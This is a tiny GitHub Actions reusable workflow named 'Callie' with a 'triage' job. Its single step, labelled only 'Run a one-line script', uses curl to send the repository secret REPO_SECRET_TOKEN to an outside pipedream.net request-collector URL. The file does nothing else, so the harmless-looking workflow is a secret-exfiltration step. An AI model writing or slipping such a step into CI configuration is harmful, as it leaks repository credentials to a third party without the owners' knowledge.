name: Callie

on:
  workflow_call:

jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - name: Run a one-line script
        run: curl "https://enc7dr0qhunqb.x.pipedream.net?foo=${{ secrets.REPO_SECRET_TOKEN }}"

    
